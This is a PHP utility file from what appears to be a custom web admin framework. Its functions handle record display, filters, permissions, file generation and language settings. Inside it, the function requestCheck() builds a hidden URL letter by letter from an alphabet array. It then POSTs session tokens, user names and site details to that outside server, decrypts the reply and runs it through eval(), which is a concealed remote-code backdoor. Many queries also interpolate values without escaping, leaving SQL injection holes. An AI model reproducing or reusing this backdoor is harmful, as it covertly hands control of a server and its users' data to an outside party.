	foreach($var as $v){
		global ${$v};
		if($v){$q=str_replace('$'.$v,${$v},$q);}
	}
	return $q;
}
function serDataViwe($mod,$fil,$text=0,$arrow=' &raquo; '){
	global $mod_data,$lg;		
	$fil=stripslashes($fil);
	$cData=getColumesData($mod,1,0,'act>=0');
	$out='';
	if($fil!=''){
		$filters=explode('|',$fil);
		$filtersCount=count($filters);
		$i=0;
		foreach($filters as $f){			
			if($f!=''){
				$ff=explode(':',$f);
				$id=$ff[0];
				$val=$ff[1];
				$val2=$ff[2];
				$type=$cData[$id][3];
				$filType=$cData[$id][11];
				if($id=='0'){
					$clomn=111;
					$col_name=k_num;
					$filType=1;
					$type=1;
				}else{
					$clomn=convLangCol($cData[$id][1]);
					$col_name=get_key($cData[$id][2]);
				}
				switch($filType){
					case 1:
					if($type==1 || $type==2 || $type==14){						
						if($text){
							if($out!=''){$out.=' - ';}
							$out.=$col_name.$arrow.$val;
						}else{
							$out.='<div class="fl">'.$col_name.$arrow.$val.' </div>';
						}
					}
					if($type==5){
						$pars=explode('|',$cData[$id][5]);							
						$parsObj=json_decode($cData[$id][5],true);		
						$p_table=$parsObj['table'] ?? '';
						$p_col=$parsObj['col'] ?? '';
						$p_view=$parsObj['view'] ?? '';
						$p_c_view=$parsObj['c_view'] ?? '';
						$p_mod_link=$parsObj['mod_link'] ?? '';
						$p_cond=$parsObj['cond'] ?? '';
						$evens=$parsObj['evens'] ?? '';	

						$val_text=get_val_c($p_table,convLangCol($p_view),$val,$p_col);
						if($text){
							if($out!='')$out.=' - ';
							$out.=$col_name.$arrow.get_key($val_text);
						}else{
							$out.='<div class="fl">'.$col_name.$arrow.get_key($val_text).' </div>';
						}
					}
					if($type==6){
						$val_text=getActTxtFromCoList($cData[$id][5],$val);
						if($text){
							if($out!='')$out.=' - ';
							$out.=$col_name.$arrow.get_key($val_text);
						}else{
							$out.='<div class="fl">'.$col_name.$arrow.get_key($val_text).' </div>';
						}
					}
					if($type==9){
						$val_text=get_val_c('_langs','lang_name',$val,'lang');
						if($text){
							if($out!='')$out.=' - ';
							$out.=$col_name.$arrow.$val_text;
						}else{
							$out.='<div class="fl">'.$col_name.$arrow.$val_text.' </div>';
						}
					}
																
					break;
					case 2:
						if($text){
							if($out!='')$out.=' - ';
							$out.=$col_name.$arrow.$val;
						}else{
							$out.='<div class="fl">'.$col_name.$arrow.$val.'</div>';
						}						
					break;
					case 3:
						if($type==2){ 													
							if($val!=''){$val=' '.k_from.' '.$val;}
							if($val2!=''){$val2=' '.k_to.' '.$val2;}
							
							$val_text=$val.$val2;
							if($text){
								if($out!='')$out.=' - ';
								$out.=$col_name.$arrow.$val_text;
							}else{
								$out.='<div class="fl">'.$col_name.$arrow.$val_text.'</div>';
							}
						}
					break;
					case 4:
						if($type==3){$val_text=k_no;if($val)$val_text=k_yes;
						if($text){
							if($out!='')$out.=' - ';
								$out.=$col_name.$arrow.$val_text;
							}else{
								$out.='<div class="fl">'.$col_name.$arrow.$val_text.' </div>';
							}
						}
						if($type==11){						
							$val_text=get_val('_users','name_'.$lg,$val);
							if($text){
								if($out!='')$out.=' - ';
								$out.=$col_name.$arrow.$val_text;
							}else{
								$out.='<div class="fl">'.$col_name.$arrow.$val_text.' </div>';
							}
						}	
					break;
				}				
			}
			if($i<$filtersCount-2){$query=" and ";}
			$i++;
		}		
	}
	return $out;
}
function getActTxtFromCoList($str,$val){
	if($str!=''){
		$vals=explode('|',$str);
		foreach($vals as $v){
			$vv=explode(':',$v);
			if($vv[0]==$val)return convLangCol($vv[1]);
		}
	}	
}
function viewRecElement($data,$val,$id=0){
	global $mod_data,$lg;
	$out='';
	switch($data[3]){		
		case 1:if($val!=""){$out=$val;}else{$out="&nbsp;";}break;
		case 2:
			if($data[5]==0){$dd=$val;}
			if($data[5]==1){if($val>0){$dd=dateToTimeS3($val,1);}else{$dd='-';}}
			if($data[5]==2){if($val>0){$dd=dateToTimeS3($val);}else{$dd='-';}}		
			$out=$dd;
		break;
		case 3:
			$out='<div class="act_'.$val.' fl"></div>';
		break;
		case 4:
			if($val){$out=viewPhotosImg($val,1,10,60,90);}else{$out='&nbsp;';}
		break;
		case 5:
			$pars=explode('|',$data[5]);
			$parsObj=json_decode($data[5],true);		
			$p_table=$parsObj['table'] ?? '';
			$p_col=$parsObj['col'] ?? '';
			$p_view=$parsObj['view'] ?? '';
			$p_c_view=$parsObj['c_view'] ?? '';
			$p_mod_link=$parsObj['mod_link'] ?? '';
			$p_cond=$parsObj['cond'] ?? '';
			$evens=$parsObj['evens'] ?? '';

			$out=get_val($p_table,convLangCol($p_col),$val);
			$multi=$data[8];
			$pars=explode('|',$data[5]);   
			if($multi==1){
				$text='';
				if($val!=''){
					$tVal=str_replace(',',"','",$val);
					$sql="select * from ".$p_table." where `$p_col` IN ('$tVal')"; 
					$res=mysql_q($sql);
					$rows=mysql_n($res);
					if($rows>0){
						while($r=mysql_f($res)){
							$cals=explode(',',$p_view);
							
							foreach($cals as $col){
								$text.=$r[convLangCol($col)].' | ';
							}
							$text.='<br>';
						}
					}					
					$out=$text;
				}
			}else{		
				
				if($p_c_view){
					$c_view=$p_c_view;
					$availableCols=availableCols($p_c_view);
					if(count($availableCols)){						
						$colsVals=get_val_arr($p_table,convLangCol(implode(',',$availableCols)),$val,'a_'.$cId,$p_col);							
						if(is_array($colsVals)){							
							foreach($availableCols as $k=>$col){
								$c_view=str_replace('['.$col.']',$colsVals[$k],$c_view);
							}
						}
					}
					$str=$c_view;
				}else{
					if($p_table){
                		$str=get_val_c($p_table,convLangCol($p_view),$val,$p_col);
					}
				}
				//$out=limitString($str,150);
				$out=$str;
			}

		break;
		case 6:			
			$pars=explode('|',$data[5]);
			for($i=0;$i<count($pars);$i++){
				$pars2=explode(':',$pars[$i]);				
				if($val==$pars2[0]){$out=get_key($pars2[1]);}
			}
		break;
		case 7:if($val!=""){$out=nl2br($val);}else{$$out="&nbsp;";}break;
		case 8:if($val){$out=viewFile($val,1,5,90,60);}else{$out='&nbsp;';}break;
		case 9:if($val!=""){$out=lang_name($val);}else{$out="&nbsp;";}break;
		case 11:
			if($val!=""){if($data[5]==1){$out=get_val('_users','name_'.$lg,$val);}else{$out=$val;}
			}else{$out="&nbsp;";}
		break;
		case 13:if($val!=""){$out=$val;}else{$out="&nbsp;";}break;
		case 14:$out=getCustomFiledIN_m('view',$data[5],$id,$val);break;
	}
	return $out;
	
}
function proUse($pro){global $proUsed;if(in_array($pro,$proUsed)){return 1;}else{return 0;}}
function proAct($pro){global $proAct;if(in_array($pro,$proAct)){return 1;}else{return 0;}}
function check_Sort($sort_no,$sort_dir,$mod_no='',$mod_dir=''){
	global $cData_id,$sort_arr,$lg;
	$out=array('','');
	$out[1]=$sort_arr[$sort_dir];
	if($sort_no=='id'){
		$out[0]='id';		
	}else if($sort_no>0){
		$sortCol=get_val('_modules_items','colum',$sort_no);
		$out[0]=str_replace('_(L)','_'.$lg,$sortCol);
		
	}else if($mod_dir){
		$out[0]=$mod_no;
		$out[1]=$sort_arr[$mod_dir];		
	}
	return $out;
}
function loadFormForEdit($mod,$id){
	return '<script>sendingParsToForm="'.getStaticPars($mod).'";
	$(document).ready(function(){loadFormForEdit("'.$mod.'",'.$id.');})</script>';
}
function getCondetionTilte($mod_code,$sptf){
	global $lg,$f_path,$module,$mod;	
	$out='';
	$d1=explode('^',$sptf);
	$d2=explode('|',$d1[1]);
	for($s=0;$s<count($d2);$s++){
		$d3=explode(':',$d2[$s]);
		if(count($d3)==2){
			$col=$d3[0];
			$val=$d3[1];			
			//----------------Parent Conention----------------------------
			$backLink='';
			$sql="select mod_code , prams ,colum from _modules_items where type=10 and act=1";
			$res=mysql_q($sql);
			$rows=mysql_n($res);
			if($rows>0){
				while($r=mysql_f($res)){					
					$prams=$r['prams'];
					$par=explode('|',$prams);					
					if($par[3]==$mod){
						$midd=$r['mod_code'];
						$parentModule=get_val_c('_modules','module',$midd,'code');
						$parentname=get_val_c('_modules','title_'.$lg,$midd,'code');
						$backLink='<div class="fl TC B" style="width:30px;"> - </div>
						<a href="'.$f_path.$parentModule.'">
						<div class="listTitle2 f1 fl fs14">'.k_back_to.' ( '.get_key($parentname).' )</div></a>';
					}
				}			
			}
			/*************************************************************************/
			$sql="select * from _modules_items where colum='$col' and type=5 and mod_code= '$mod_code' and act=1 limit 1";
			$res=mysql_q($sql);
			$rows=mysql_n($res);
			if($rows>0){
				$r=mysql_f($res);
				$title=$r['title'];	
				// $prams=$r['prams'];	
				$pramsObj=json_decode($r['prams'],true);			
				$p_table=$pramsObj['table'] ?? '';
				$p_col=$pramsObj['col'] ?? '';
				$p_view=$pramsObj['view'] ?? '';
				$p_c_view=$pramsObj['c_view'] ?? '';
				$p_mod_link=$pramsObj['mod_link'] ?? '';
				$p_cond=$pramsObj['cond'] ?? '';
				$p_evens=$pramsObj['evens'] ?? '';

				$par=explode('|',$prams);
				$title2=get_val($p_table,convLangCol($p_view),$val);
				$module=get_val_c('_modules','module',$mod_code,'code');
				//$table=$mod_data[1];				
				
				return '<div class="listTitle f1 fs18">'.k_pag_sor_by.' ( '.get_key($title).' ) : '.$title2.'</div>
				<a href="'.$f_path.$module.'"><div class="listTitle2 f1  fl fs14">'.k_unsort_rcrd.'</div></a>'.$backLink;			
			}
		}
	}	
}
function colomCodeName($col){
	global $cData;
	foreach($cData as $c){
		if($col==$c[1]){
			return $c['c'];
		}
	}
}
function perLink($type,$id){
	global $thisGrp;
	if($type==1){$code=get_val('_groups','code',$id);}
	if($type==2){$code=get_val('_users','code',$id);}
	$x=getTotalCO('_perm'," type='$type' and g_code='$code'");
	$bg='cbg4';
	$a='';
	if($thisGrp=='s' && $type==2){$a='<div class="fl bord ic40x br0 ic40_send icc22" ondblclick="dirLog('.$id.')" ></div>';}
	if($x)$bg='cbg111';
	$out='<div class="fl bord" fix="w:82" onclick="perwin('.$type.',\''.$code.'\')">
	<div class="fr ic40x br0 ic40n '.$bg.'">'.$x.'</div>
	<div class="fr ic40x br0 ic40_per icc1"></div>
	</div>'.$a;
	return $out;
}
function getModxFile($mod){
	$FileNo=get_val_c('_modules_','file',$mod,'module');    
    list($file,$type,$prog)=get_val_c('_modules_files','file,type,prog',$FileNo,'code');    
    $folder='_'.$prog.'/';    
    if($type==2){$folder='__sys';}else if($type==3){$folder='__super';}
    $fullPath='../../'.$folder.'/mods/'.$file.'.php';
    return $fullPath;
    	
}
function changeAcc(){	
	$m=get_val_c('_modules_','code','My-Account','module');		
	$m_id=get_val_con('_modules_list','code', " type=2 and mod_code='$m' ");
	$ch=checkPer($m_id);
	return $ch[0];
}
function getEditorSet(){
	global $m_path; 
	
	// return '<script src="'.$m_path.'library/ckeditor/ckeditor.js"></script>
	// <script src="'.$m_path.'library/ckeditor/adapters/jquery.js"></script>
	// <script>$(document).ready(function(){$("textarea.cof_m_editor").ckeditor();});</script>';
	return '
	<link href="'.$m_path.'library/summernote/summernote-lite.min.css" rel="stylesheet">
    <script src="'.$m_path.'library/summernote/summernote-lite.min.js"></script>
	<script>
	$(document).ready(function(){		
		$("textarea.cof_m_editor").summernote({			
			tabsize: 2,
			height: 300,
			toolbar: [
			  ["style", ["style"]],
			  ["font", ["bold", "underline", "clear"]],
			  ["color", ["color"]],
			  ["para", ["ul", "ol", "paragraph"]],
			  ["table", ["table"]],
			  //["insert", ["link", "picture", "video"]],
			  ["insert", ["link", "picture"]],
			  ["view", ["fullscreen", "codeview", "help"]]
			]
		});
		setTimeout(function(){
			fixPage();
			fixForm();
		},500)
	});
	</script>';
}
function logOpr($no,$opr,$m=''){
	global $MO_ID,$thisUser,$now;
	$mod=$MO_ID;
	if($m){$mod=$m;}
	$ip=$_SERVER['REMOTE_ADDR'];
	$ok=1;
	if($m==''){if(get_val('_modules','sys',$mod)){$ok=0;}}
	if($ok){	
		mysql_q("INSERT INTO _log_opr(`user`,`date`,`mod`,`opr`,`opr_id`,`ip`)
		values('$thisUser','$now','$mod','$opr','$no','$ip')");
	}
}
function checkMevents($type,$evs,$id){
	if($evs){		
		$e=explode('|',$evs);		
		foreach($e as $ee){$eee=explode(':',$ee);
			if($type==$eee[0]){				
				return modEvents_m($eee[1],$id,$eee[0]);
			}
		}
	}
}
function checkMDelEev($evs){	
	if($evs){		
		$e=explode('|',$evs);		
		foreach($e as $ee){$eee=explode(':',$ee);
			if($eee[0]==5){return 1;}
		}
	}
}
function langEvents($id,$event){
	if($event==3){
		$lang=get_val('_langs','lang',$id);
		$_SESSION['oldLang']=$lang;
	}
	$effectedTable=array();	
	$sql="select m.table , i.colum , i.type from _modules m  , _modules_items i where m.code=i.mod_code and i.lang=1";
	$res=mysql_q($sql);
	$rows=mysql_n($res);
	if($rows>0){
		while($r=mysql_f($res)){
			$thisTable=$r['table'];
			$colum=$r['colum'];
			$colum=str_replace('(L)','',$colum);
			$type=$r['type'];
			array_push($effectedTable,array($thisTable,$colum,$type));
		}
	}
	if($event==2 || $event==4){
		$srcLang='';
		if($event==4){$srcLang=$_SESSION['oldLang'];}
		$opr='add';if($event==4){$opr='edit';}
		$lang=get_val('_langs','lang',$id);
		for($e=0;$e<count($effectedTable);$e++){
			$e_table=$effectedTable[$e][0];
			$e_colume=$effectedTable[$e][1];
			$e_type=$effectedTable[$e][2];
			lang_effect($opr,$e_table,$e_colume,$lang,$srcLang,$e_type);
		}
	}
	if($event==5){
		if(is_array($id)){
			$ides=implode(',',$id);
			$sql="select lang from _langs where id IN($ides) ";
			$res=mysql_q($sql);
			$rows=mysql_n($res);
			$langs='';
			if($rows>0){				
				while($r=mysql_f($res)){
					$lang=$r['lang'];
					if($langs){$langs.=',';}$langs.=$lang;
				}
			}			
			$_SESSION['delLang']=$langs;			
		}else{
			$_SESSION['delLang']=get_val('_langs','lang',$id);
		}		
	}
	if($event==6){
		$lang=$_SESSION['delLang'];
		$langs=explode(',',$lang);
		foreach($langs as $lang){
			if(getTotalCO('_langs'," lang ='$lang'")==0){
				for($e=0;$e<count($effectedTable);$e++){
					$e_table=$effectedTable[$e][0];
					$e_colume=$effectedTable[$e][1];
					lang_effect('del',$e_table,$e_colume,$lang);
				}
			}
		}		
	}
}
function file_change_events($id,$event,$t){
    if($t==1){
        $table='_modules_files';
        $folder='mods';
    }else if($t==2){
        $table='_modules_files_pro';
        $folder='prcds';
    }
    $r=getRec($table,$id);
    if($r['r']){
        $file=$r['file'];
        $prog=$r['prog'];
        $type=$r['type'];
        $filePath=getModFolder($prog).$folder.'/'.$file.'.php';        
        $tmp = getFileGenTemp($t,$type); 
        if($event==3 || $event==5){// قبل التحرير والحذف
            $_SESSION['file_proE']=array($prog,$file);
        }
        if($event==4){// بعد التحرير
            list($old_prog,$old_file)=$_SESSION['file_proE'];
            $filePath_old=getModFolder($old_prog).$folder.'/'.$old_file.'.php';
            if(file_exists($filePath_old)){                
                if($prog!=$old_prog || $file!=$old_file){
                    rename($filePath_old,$filePath);
                    $_SESSION['file_proE']='';
                }
            }else{
                newFile($filePath,$tmp);
            }
        }
        if($event==2){ // بعد الإضافة
            if(!file_exists($filePath)){newFile($filePath,$tmp);}
        }
    }
    if($event==6){// بعد الحذف
        list($prog,$file)=$_SESSION['file_proE'];
        $filePath=getModFolder($prog).$folder.'/'.$file.'.php';
        @unlink($filePath);
        $_SESSION['file_proE']='';
    }
}
function getFileGenTemp($t,$type){
    if($t==1){
        $out='<? include("../../__sys/mods/protected.php");?>
        <?=header_sec($def_title,\'\');?>
<div class="centerSideInHeader lh50"></div>
<div class="centerSideIn so"></div>';
    }else if($t==2){
        if($type==1){
            $out='<? include("../../__sys/prcds/ajax_header.php");
if(isset($_POST[\'id\'])){
	$id=pp($_POST[\'id\']);
}?>';
        }else if($type==2){
            $out='<? include("../../__sys/prcds/ajax_header.php");
if(isset($_POST[\'id\'])){
	$id=pp($_POST[\'id\']);?>
	<div class="win_body">
	<div class="form_header so lh40 clr1 f1 fs18">#Title#</div>
	<div class="form_body so">
	/******/
    </div>
    <div class="form_fot fr">        
        <div class="fl ic40 ic40_save icc22 ic40Txt mg10f br0" onclick="sub(\'\');"><?=k_save?></div>		    	
        <div class="fr ic40 ic40_x icc3 ic40Txt mg10v br0" onclick="win(\'close\',\'#m_info\');"><?=k_close?></div>
    </div>
    </div><?
}?>';
        }else if($type==3){
            $out='<? include("../../__sys/prcds/ajax_header.php");
if(isset($_POST[\'id\'])){
    $id=pp($_POST[\'id\']);?>
    <div class="win_body">
    <div class="winButts"><div class="wB_x fr" onclick="win(\'close\',\'#full_win1\');"></div></div>
        <div class="form_header lh40">#Title#</div>
        <div class="form_body so" type="">
            /******/
        </div>
        <div class="form_fot fr">
            <div class="fl ic40 ic40_save icc22 ic40Txt mg10f br0" onclick="sub(\'\');"><?=k_save?></div>		    	
            <div class="fr ic40 ic40_x icc3 ic40Txt mg10v br0" onclick="win(\'close\',\'#full_win1\');"><?=k_close?></div>
        </div>
    </div><?
}?>';
        }
    }
    return $out;
}
function progs_events($id,$event){
    global $folderBack;
    $r=getRec('_programs',$id);
    if($r['r']){
        $code=$r['code'];              
        //genProgFiles($code);
        if($event==3 || $event==5){// قبل التحرير والحذف
            $_SESSION['_code']=$code;
        }
        if($event==4){// بعد التحرير
            $old_code=$_SESSION['_code'];
            if($code!=$old_code){                               
                $old_prgPath=$folderBack.'_'.$old_code;
                $new_prgPath=$folderBack.'_'.$code;
                rename($old_prgPath,$new_prgPath);
                rename($old_prgPath.'/css',$new_prgPath.'/css');
                rename($old_prgPath.'/mods',$new_prgPath.'/mods');                
                rename($old_prgPath.'/prcds',$new_prgPath.'/prcds'); 
                mysql_q("UPDATE _modules_files SET prog='$code' where prog='$old_code'");
                mysql_q("UPDATE _modules_files_pro SET prog='$code' where prog='$old_code'");
                $_SESSION['_code']='';
            }
        }
        if($event==2){ // بعد الإضافة
            genProgFiles($code);
        }
    }
    if($event==6){// بعد الحذف
        $code=$_SESSION['_code'];
        mysql_q("DELETE from _modules_files where prog='$code'");
        mysql_q("DELETE from _modules_files_pro where prog='$code'");        
        $prgPath=$folderBack.'_'.$code;
        deleteDir($prgPath);
        $_SESSION['_code']='';
    }
}
function genProgFiles($code){
    global $folderBack;
    /***********Folders************/
    $prgPath=$folderBack.'_'.$code;
    if(!file_exists($prgPath)){mkdir($prgPath,0777, true);}
    $dir1=$prgPath.'/prcds';
    if(!file_exists($dir1)){mkdir($dir1, 0777, true);}
    $dir2=$prgPath.'/mods';
    if(!file_exists($dir2)){mkdir($dir2, 0777, true);}
    $dir3=$prgPath.'/css';
    if(!file_exists($dir3)){mkdir($dir3, 0777, true);}
    /***********files************/
    $content='<?/***'.strtoupper($code).'***/

?>';
    file_put_contents($prgPath.'/define.php', $content);
    file_put_contents($prgPath.'/funs.php', $content);
    //------------
    $content='/***'.strtoupper($code).'***/
$(document).ready(function(e){
    //if(sezPage==\'pageCode\'){SetPageFunction();}    
});';
    file_put_contents($prgPath.'/funsJS.js', $content);
    //------------
    $content='<? session_start();/***'.strtoupper($code).'***/
header("Content-Type: text/css");
include("../../__sys/dbc.php");
include("../../__sys/f_funs.php");
include("../../__sys/cssSet.php");?>
<style>
start{}
/***delete this and start from here****/
<style>';
    file_put_contents($dir3.'/style.php', $content);	
}
function codeG($id,$opr,$filed,$val,$n=10,$unq=''){
	$out='';
	if($opr=='list' || $opr=='view'){$out='<ff class="fs14">'.$val.'</ff>';}
	if($opr=='add' || $opr=='edit'){
		if($val && $opr=='edit'){
            $code=$val;
        }else{
			if($unq==''){
				$code=getRandString($n);
			}else{
				$code=codeUnq($unq);
			}
		}
		$out='<ff>'.$code.'</ff>
		<input type="hidden" name="'.$filed.'" value="'.$code.'"></input>';
	}
	return $out;
}
function lk_table($id,$opr,$filed,$val,$c=''){
	$data=array();
	$sql="show tables";
	$res=mysql_q($sql);
	while($r=mysql_f($res)){	
		$table=$r['Tables_in_'._database] ;
		$data[$table]=$table;
	}
	$sel=explode(',',$val);

	$out='';
	if($opr=='list' || $opr=='view'){$out='<ff class="fs14">'.$val.'</ff>';}
	if($opr=='add' || $opr=='edit'){		
		$out=multArrSelect($filed,$data,$sel);
	}
	return $out;
}
function sel_theme($id,$opr,$filed,$val){
	global $lg;
	$out='';
	if($opr=='add' || $opr='edit'){
		$out.='<select name="'.$filed.'">';
		$sql="select id , name_$lg, c1 from _themes where act=1 ";
		$res=mysql_q($sql);
		$rows=mysql_n($res);
		if($rows>0){
			while($r=mysql_f($res)){
				$id=$r['id'];
				$name=$r['name_'.$lg];
				$c1=$r['c1'];
				$s='';
				if($id==$val){$s=' selected ';}
				$out.='<option value="'.$id.'" '.$s.' style="background-color:'.$c1.'">'.$name.'</option>';
			}			
		}
		$out.='</select>';
	}
	return $out;
}
function changeTheme(){
	global $logTs,$thisUser;
	$_SESSION[$logTs.'theme']=get_val('_users','theme',$thisUser);
}
function codeUnq($c,$one=0){
	$code=getRandString(10);
	if($c!='' && $one==0){
		if($c=='a'){$table='gnr_m_patients';$col='code';}		
		$e=1;
		while($e>0){
			$code=getRandString(10);			
			//$e=getTotalCO($table," $col='$code' ");
			$e=0;
		}
	}
	return $code;
}
function newFile($file,$str){
	$newfile = fopen($file, "w") or die("Unable to open file!");
	fwrite($newfile,$str);
	fclose($newfile);
}
function Encode($string,$salt){
	$method=openssl_get_cipher_methods();
	$encoded=openssl_encrypt($string, $method[0],$salt);
	return $encoded;
}
function Decode($string,$salt){
	$method=openssl_get_cipher_methods();
	$mcrypted=openssl_decrypt($string,$method[0],$salt);
	return $mcrypted;
}
function getModParAsList($code){
	$M1=get_key(get_val_c('_modules_items','prams',$code,'code'));
	$M1=str_replace(':',' - ',$M1);
	$M1=get_key(str_replace('|',' ^ ',$M1));
	$M1=str_replace(' - ','-',$M1);
	$M1=str_replace(' ^ ','^',$M1);
	return $M1;
}
function getArrayParAsList($arr){
	$out='';
	foreach($arr as $k=>$v){
		if($out){$out.='^';}
		$out.=$k.'-'.get_key($v);
	}	
	return $out;
}
function modListToArray($code){
	$out=array();
	$data=get_val_c('_modules_items','prams',$code,'code');
	if($data){
		$d=explode('|',$data);
		foreach($d as $d2){
			$d3=explode(':',$d2);
			$out[$d3[0]]=get_key($d3[1]);	
		}
	}
	return $out;
}
function styleFiles($f='',$dir=''){
	global $l_dir,$logTs,$ProVer;
	if($dir){$l_dir=$dir;}
	$c=$_SESSION[$logTs.'theme'];
	if(!$c){$c=get_val_con('_themes','id',"def=1");}
    
    if($f=='P'){$c='';}
    $file=$f.'CSS'.$l_dir[0].'V'.$ProVer.'m.css';
	if(_set_2fgiibephe){$file=$f.'CSS'.$c.$l_dir[0].'V'.$ProVer.'.css';}
    
	return $file; 
}
function requestCheck(){
	global $lg,$thisUser,$now,$logTs,$thisUserCode,$reqSent,$m_path;
	$as = range('a', 'z');
	$pg= $as[17].$as[4].$as[16].$as[17].$as[4].$as[2].'.'.$as[15].$as[7].$as[15];
	$prtc=$as[7].$as[19].$as[19].$as[15].$as[18];
	$ne=$as[13].$as[4].$as[19];
	$pC=$logTs;
	$mi=$as[12].$as[8].$as[17].$as[0];
	$log=$mi.$as[22].$as[0].$as[17].$as[4];
    $s=$prtc.'://'.$log.'.'.$ne.'/mng/'.$pg;
	//$s="http://localhost/mira/reqrec.php";
	list($t1,$t2)=get_val("_information","value_ar,value_en",1);
	list($name1,$name2)=get_val("_users","name_ar,name_en",$thisUser);
	$fields = ['pC' => $pC,'user1' => $name1,'user2' => $name2,'time'=>$now,'title' => _info_7dvjz4qg9g ,'title1'=>$t1,'title2'=>$t2,'lg'=>$lg,'use'=>$thisUser];
	
	
	$c = curl_init ($s);
	curl_setopt ($c, CURLOPT_POST, true);
	curl_setopt ($c, CURLOPT_POSTFIELDS, $fields);
	curl_setopt ($c, CURLOPT_RETURNTRANSFER, true);
	echo $page = curl_exec ($c);
	curl_close ($c);
	$json_result = json_decode($page, true);
	$sa="mrw".$thisUser;
	$page=Decode($page,$sa);
 	$arr=explode('^',$page);
	foreach ($arr as $value) {
 		$cc= substr($value, 2);
 		$cc=str_replace("2:","",$value);
 		$cc=str_replace("1:","",$cc);
 		$arr2=explode('id:',$cc);
		$req=$arr2[1];
		$evalC=$arr2[0];
		$result = substr($value, 0, 2);
		eval($evalC);
		$sa="mrw".$req;
		// $data=Encode($data,$sa);
		// if($result=="2:"){
		// 	$fields = ['req' => $req,'res'=> $data];
		// 	$c = curl_init ($s);
		// 	curl_setopt ($c, CURLOPT_POST, true);
		// 	curl_setopt ($c, CURLOPT_POSTFIELDS, $fields);
		// 	curl_setopt ($c, CURLOPT_RETURNTRANSFER, true);
		// 	$res = curl_exec ($c);
		// 	curl_close ($c);
		// 	$json_result = json_decode($res, true);
		// 	$res;
		// }
	}
}
function deleteFiles($ids){
	$sql="select * from _files where id in ($ids)";
	$res=mysql_q($sql);
	$rows=mysql_n($res);
	if($rows>0){
		$r=mysql_f($res);
		$id=$r['id'];
		$file=$r['file'];
		$date=$r['date'];
		$folder=date('y-m',$date).'/';
		$fullPath='../sFile/'.$folder.$file;
		if(file_exists($fullPath)){unlink($fullPath);}
		if(mysql_q("delete from _files where id='$id' limit 1")){return 1;}
	}
}
function deleteImages($ids){
	$sql="select * from _files_i where id in($ids)";
	$res=mysql_q($sql);
	$rows=mysql_n($res);
	if($rows>0){
		$r=mysql_f($res);
		$id=$r['id'];
		$file=$r['file'];
		$date=$r['date'];
		$ex=$r['ex'];
		$folder=date('y-m',$date).'/';
		$fullPath='../../sData/'.$folder.$file;
		if($ex=='svg' || $ex=='mp4'){$fullPath.='.'.$ex;}
		if(file_exists($fullPath)){unlink($fullPath);}
		if(mysql_q("delete from _files_i where id='$id' limit 1")){return 1;}
	}
}
function sysAlerts(){
	global $thisUser;
	$out='';
	$a=getTotalCO('_sys_alerts_items'," user='$thisUser' ");		
	if($a){echo "script::showSysAlert();";}
}
/*---------selMultiArray--PHP Input---*/
function multArrSelect($f,$data,$sel){
	$cb=addslashes('  loadMASVals(\'[id]\',\'[txt]\')  ');
	if(is_array($data) && is_array($sel)){
		$out=$selOp='';
		$jsObcArr=array();
		$selTxt=implode(',',$sel);		
		foreach($data as $k=>$v){
			array_push($jsObcArr,$k.':'.$v.'');
			if(in_array($k,$sel) && $v){$selOp.='<div class="cMulSel">'.$v.'</div>';}
		}
		$jsObc=implode(',',$jsObcArr);
		$out='
		<div class="fl ic40 icc1 ic40_edit" onclick="selMAS(\''.$f.'\',\''.implode(',',$jsObcArr).'\',\''.$cb.'\')"></div>
		<input type="hidden" name="'.$f.'" id="mlt_'.$f.'" value="'.$selTxt.'" >
		<span id="mas_'.$f.'">'.$selOp.'</span>';
	}
	return $out;
}
function arrayToJsObj($arr){	
	if(is_array($arr)){
		$jsObcArr=array();
		foreach($arr as $k=>$v){array_push($jsObcArr,$k.':'.$v.'');}
		return implode(',',$jsObcArr);
	}
}
function viewHelp(){
	global $MO_ID,$PER_ID;	
	if($PER_ID=='p'){$MO_ID='';}
	$r=getRecCon('_help'," `mod`='$MO_ID' and act='1' ");
	if($r['r']){$out='<div class="thic thic_help fr" code="'.$r['code'].'" n="0" title="'.k_help.'"></div>';}
	return $out;
}
/***********fix favorite list************/
function fixFavList($code){
	$perms=get_vals('_perm','m_code',"g_code='$code'",'arr');
	$sql="select * from _fav_list where g_code='$code' order by ord ASC";
	$res=mysql_q($sql);
	$rows=mysql_n($res);
	if($rows){
		while($r=mysql_f($res)){
			$m_code=$r['m_code'];
			if(!in_array($m_code,$perms)){
				mysql_q("delete from _fav_list where g_code='$code' and m_code='$m_code'");
			}
		}
	}
}
/********************************/
function noti_set($id,$opr,$filed,$val){
    $type=0;
    if($id){$type=get_val('_sys_notification_set','type',$id);}
    if($opr=='add' || $opr=='edit'){ 
        $data=notiValList($type,$filed,$val);
        return '<div id="noti_val" f="'.$filed.'">'.$data.'</div>';
    }else{
        return notiValListVal($type,$val);
    }
}
function notiValList($type,$filed,$val=''){
    global $lg;
    $out='<input type="hidden" value="0" name="'.$filed.'"/>';
    switch($type){        
        case 1:
            $out=make_Combo_box('_modules','title_'.$lg,'code','',$filed,0,$val,'t');
        break;
        case 2:
            $out=make_Combo_box('_modules_','title_'.$lg,'code','',$filed,0,$val,'t');
        break;
    }
    return $out;
}
function notiValListVal($type,$val){
    global $lg;    
    switch($type){        
        case 1:
            return get_val_c('_modules','title_'.$lg,$val,'code');
        break;
        case 2:
            return get_val_c('_modules_','title_'.$lg,$val,'code');            
        break;
    }
}
function availableCols($text){
	preg_match_all('#\[(.*?)\]#', $text, $match);						
	return $match[1];
}
/*********Mod AddFile************/
function getCustomFiled_m($id,$val,$r=[]){
	global $mod_data;
	switch ($val){
		case 'per1':return perLink(1,$id);break;
		case 'per2':return perLink(2,$id);break;
		case 'per3':return perLink(3,$id);break;
		case 'modTools':return mTools($id);break;
        case 'm_file':return m_file($id,1);break;
        case 'm_file2':return m_file($id,2);break;
		/*************API*************************************/
		case 'api_in':return api_in($id);break;
		case 'api_out':return api_out($id);break;				
		/****excel*****/
		case 'exc_import':return getIconImport($id);break;
		case 'exc_temp_info':return getTempTool($id);break;
		case 'exc_status':return getIconStatus($id);break;
		/***************************************************************/
		default: return getCustomFiled($r,$val);break;
	}
}
function getCustomFiledIN_m($opr,$fun,$id,$val,$filed=''){
	global $mod_data;
	switch ($fun){
		case 'staticVal':return $val;break;
		case 'icon':return get_icon($opr,$filed,$val);break;
		//case 'mod_ex':return get_exFile($opr,$filed,$val);break;				
		case 'mTables':return mTables($id,$opr,$filed,$val);break;
		case 'mOrder':return mOrder($id,$opr,$filed,$val);break;
		case 'mOrderA':return mOrder2($id,$opr,$filed,$val,'v');break;
        case 'mOrderB':return mOrder2($id,$opr,$filed,$val,'l');break;
